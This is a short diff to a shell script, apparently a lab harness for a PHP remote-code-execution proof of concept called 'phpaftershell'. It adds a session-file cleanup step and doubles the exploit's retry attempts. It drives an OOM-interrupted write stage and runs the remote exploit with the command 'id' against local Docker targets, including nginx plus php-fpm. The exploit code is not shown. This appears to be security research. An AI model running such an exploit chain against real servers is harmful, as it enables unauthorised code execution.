@@ -15,6 +15,7 @@ echo "== stage 2: real OOM-interrupted pwrite"
 python3 -u poc/stage2_oom.py
 
 echo "== fresh target for the remote exploit"
+rm -f sessions/sess_*
 docker compose -p phpaftershell up -d --force-recreate --wait victim
 curl -sf http://127.0.0.1:8087/ >/dev/null
 
@@ -23,7 +24,7 @@ python3 -u poc/charge_trace.py 8087 | sed -n '1,6p'
 
 echo "== remote exploit (100% HTTP)"
 python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 \
-  --command 'id' --attempts 40
+  --command 'id' --attempts 80
 
 echo "== cross-SAPI: same chain against nginx + php-fpm"
 python3 -u ./phpaftershell-poc --target http://127.0.0.1:8090 \
